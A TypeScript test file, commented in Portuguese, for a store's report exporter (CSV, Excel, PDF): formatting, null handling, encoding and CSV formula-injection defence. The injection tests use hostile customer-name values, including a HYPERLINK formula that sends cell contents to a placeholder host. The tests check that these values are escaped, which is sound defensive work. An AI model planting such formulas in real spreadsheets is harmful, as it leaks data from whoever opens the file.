import { describe, it, expect } from "vitest";
import { gerarCsv, exportar } from "@/application/relatorios/exportacao";
import { gerarXlsx } from "@/application/relatorios/planilha";
import { gerarPdf } from "@/application/relatorios/documento";
import { formatarCelula } from "@/application/relatorios/formato";
import type { Relatorio } from "@/application/relatorios/tipos";

/**
 * Exportação de relatório.
 *
 * O QUE ESTES TESTES PROTEGEM, além de "o arquivo abre":
 *
 *  1. a ressalva viaja junto. Um CSV de vendas sem a frase "venda registrada
 *     não é faturamento recebido" é um convite a somar coisas diferentes;
 *  2. nulo não vira zero em lugar nenhum. Ticket médio sem pedido é "—";
 *  3. o exportador não inventa conta: o total que sai no arquivo é o total
 *     que o banco mandou.
 */

const RELATORIO: Relatorio = {
  ok: true,
  tipo: "vendas_por_dia",
  titulo: "Vendas por dia",
  periodo: { rotulo: "Últimos 7 dias", de: "2026-09-16", ate: "2026-09-22", dias: 7 },
  colunas: [
    { chave: "data", rotulo: "Data", tipo: "data" },
    { chave: "pedidos", rotulo: "Pedidos", tipo: "numero" },
    { chave: "vendas_registradas", rotulo: "Venda registrada", tipo: "dinheiro" },
    { chave: "ticket_medio", rotulo: "Ticket médio", tipo: "dinheiro" },
  ],
  linhas: [
    { data: "2026-09-16", pedidos: 3, vendas_registradas: 184.5, ticket_medio: 61.5 },
    // Dia sem pedido: ticket médio NULO, não zero.
    { data: "2026-09-17", pedidos: 0, vendas_registradas: 0, ticket_medio: null },
  ],
  totais: { pedidos: 3, vendas_registradas: 184.5 },
  ressalvas: [
    "Venda registrada é pedido concluído no dia. Faturamento recebido é pagamento confirmado no dia.",
  ],
  linhas_retornadas: 2,
  limite: 500,
  truncado: false,
  exportacao: true,
};

const texto = (bytes: Uint8Array) => new TextDecoder().decode(bytes);

describe("formatarCelula", () => {
  it("não desloca a data de negócio por causa de fuso", () => {
    // O banco já devolveu a data no fuso da loja; ela não pode virar o dia
    // anterior no caminho até a planilha.
    expect(formatarCelula("2026-09-17", "data")).toBe("17/09/2026");
  });

  it("não transforma nulo em zero", () => {
    expect(formatarCelula(null, "dinheiro")).toBe("—");
    expect(formatarCelula(null, "numero")).toBe("—");
    expect(formatarCelula(null, "data")).toBe("—");
  });

  it("formata dinheiro no padrão brasileiro", () => {
    expect(formatarCelula(61.5, "dinheiro")).toBe("R$ 61,50");
    expect(formatarCelula(0, "dinheiro")).toBe("R$ 0,00");
    expect(formatarCelula(-11, "dinheiro")).toBe("-R$ 11,00");
    expect(formatarCelula("closed", "texto")).toBe("Fechada");
    expect(formatarCelula("open", "texto")).toBe("Aberta");
  });
});

describe("CSV", () => {
  const arquivo = gerarCsv(RELATORIO);
  const conteudo = texto(arquivo.bytes);

  it("abre no Excel brasileiro: BOM, ponto e vírgula", () => {
    // Sem o BOM em bytes, o Excel abre "Período" como "PerÃ­odo".
    expect([arquivo.bytes[0], arquivo.bytes[1], arquivo.bytes[2]]).toEqual([0xef, 0xbb, 0xbf]);
    expect(conteudo).toContain('"Data";"Pedidos";"Venda registrada";"Ticket médio"');
  });

  it("leva o título, o período e a ressalva dentro do arquivo", () => {
    expect(conteudo).toContain("Vendas por dia");
    expect(conteudo).toContain("Últimos 7 dias");
    expect(conteudo).toContain("Venda registrada é pedido concluído no dia.");
  });

  it("mantém o nulo como travessão, não como zero", () => {
    const linhas = conteudo.split("\r\n");
    const semPedido = linhas.find((l) => l.includes("17/09/2026"));
    expect(semPedido).toBeDefined();
    expect(semPedido).toContain('"—"');
  });

  it("nomeia o arquivo pelo relatório e pelo período", () => {
    expect(arquivo.nome).toBe("vendas-por-dia-2026-09-16-a-2026-09-22.csv");
    expect(arquivo.tipoConteudo).toContain("text/csv");
  });
});

describe("Excel", () => {
  const arquivo = gerarXlsx(RELATORIO);

  it("produz um ZIP válido (assinatura PK)", () => {
    expect(arquivo.bytes[0]).toBe(0x50);
    expect(arquivo.bytes[1]).toBe(0x4b);
    expect(arquivo.bytes.length).toBeGreaterThan(500);
  });

  it("declara o tipo de conteúdo do xlsx", () => {
    expect(arquivo.tipoConteudo).toContain("spreadsheetml.sheet");
    expect(arquivo.nome.endsWith(".xlsx")).toBe(true);
  });

  it("é determinístico: mesmo relatório, mesmos bytes", () => {
    const outro = gerarXlsx(RELATORIO);
    expect(Buffer.from(outro.bytes).equals(Buffer.from(arquivo.bytes))).toBe(true);
  });
});

describe("PDF", () => {
  const arquivo = gerarPdf(RELATORIO);
  const conteudo = texto(arquivo.bytes);

  it("produz um PDF com cabeçalho e trailer", () => {
    expect(conteudo.startsWith("%PDF-1.4")).toBe(true);
    expect(conteudo).toContain("startxref");
    expect(conteudo.trimEnd().endsWith("%%EOF")).toBe(true);
  });

  it("leva o título e a ressalva para dentro do documento", () => {
    expect(conteudo).toContain("Vendas por dia");
    expect(conteudo).toContain("Venda registrada");
  });

  it("declara o tipo de conteúdo do PDF", () => {
    expect(arquivo.tipoConteudo).toBe("application/pdf");
    expect(arquivo.nome.endsWith(".pdf")).toBe(true);
  });
});

describe("exportar", () => {
  it("escolhe o formato pedido, e cai em CSV por padrão", () => {
    expect(exportar(RELATORIO, "csv").tipoConteudo).toContain("csv");
    expect(exportar(RELATORIO, "xlsx").tipoConteudo).toContain("spreadsheetml");
    expect(exportar(RELATORIO, "pdf").tipoConteudo).toBe("application/pdf");
  });

  it("não cria nenhuma coluna além das que o banco mandou", () => {
    const conteudo = texto(gerarCsv(RELATORIO).bytes);
    const cabecalho = conteudo.split("\r\n").find((l) => l.startsWith('"Data"'));
    expect(cabecalho?.split(";").length).toBe(RELATORIO.colunas.length);
    // Nada de lucro, margem ou salário entrando pela porta da exportação.
    expect(conteudo.toLowerCase()).not.toContain("lucro");
    expect(conteudo.toLowerCase()).not.toContain("margem");
    expect(conteudo.toLowerCase()).not.toContain("salário");
  });
});

/**
 * Injeção de fórmula em planilha (Fase 10, §12).
 *
 * O nome do cliente é escrito por um ANÔNIMO no checkout e sai no relatório
 * de pedidos. `"=HYPERLINK(…)"` entre aspas não é texto para o Excel: ele
 * consome as aspas na importação e avalia o que sobra. Quem abre o arquivo é
 * a Shalon, na máquina dela.
 */
describe("CSV — conteúdo do usuário não vira fórmula", () => {
  const hostil: Relatorio = {
    ...RELATORIO,
    tipo: "pedidos",
    colunas: [
      { chave: "cliente", rotulo: "Cliente", tipo: "texto" },
      { chave: "total", rotulo: "Total", tipo: "dinheiro" },
      { chave: "saldo", rotulo: "Saldo", tipo: "numero" },
    ],
    linhas: [
      { cliente: '=HYPERLINK("http://ex.invalid/?"&A1,"Clique")', total: 10, saldo: -12.5 },
      { cliente: "+1+1", total: 10, saldo: -12.5 },
      { cliente: "-2+3", total: 10, saldo: -12.5 },
      { cliente: "@SUM(1+1)", total: 10, saldo: -12.5 },
      { cliente: "Maria Conceição", total: 10, saldo: -12.5 },
    ],
    totais: {},
  };

  const linhasDeDados = () =>
    texto(gerarCsv(hostil).bytes)
      .split("\r\n")
      .filter((l) => l.includes(";"))
      .slice(1);

  it("nenhuma célula de texto começa por =, +, - ou @", () => {
    for (const linha of linhasDeDados()) {
      expect(linha.startsWith('"=')).toBe(false);
      expect(linha.startsWith('"+')).toBe(false);
      expect(linha.startsWith('"-')).toBe(false);
      expect(linha.startsWith('"@')).toBe(false);
    }
  });

  it("marca como literal e preserva o que o cliente escreveu", () => {
    const linha = linhasDeDados()[0]!;
    expect(linha.startsWith(`"'=HYPERLINK(`)).toBe(true);
    expect(linha).toContain("http://ex.invalid/?");
  });

  it("não mexe em nome comum", () => {
    expect(linhasDeDados()[4]!.startsWith('"Maria Conceição"')).toBe(true);
  });

  it("não prefixa número negativo, que precisa continuar somável", () => {
    // A coluna `saldo` é `numero`: sai do nosso formatador, nunca do usuário.
    for (const linha of linhasDeDados()) expect(linha).toContain('"-12,50"');
  });
});

/**
 * PDF e os caracteres que o próprio sistema gera (Fase 10, §12).
 *
 * O travessão de nulo e as reticências de corte vivem na faixa WinAnsi
 * 0x80–0x9F, que NÃO é latin-1. Sem a tabela, o relatório em PDF mostra "?"
 * exatamente onde a tela mostra "—".
 */
describe("PDF — WinAnsi", () => {
  const comNulo: Relatorio = {
    ...RELATORIO,
    titulo: "Vendas — por dia",
    linhas: [{ data: "2026-09-17", pedidos: 0, vendas_registradas: 0, ticket_medio: null }],
  };
  const conteudo = () => Buffer.from(gerarPdf(comNulo).bytes).toString("latin1");

  it("grava o travessão de nulo como travessão, não como interrogação", () => {
    expect(conteudo()).toContain("\x97"); // — em WinAnsi
  });

  it("mantém acento e cedilha", () => {
    expect(Buffer.from(gerarPdf(RELATORIO).bytes).toString("latin1")).toContain(
      "Ticket m\xe9dio",
    );
  });
});
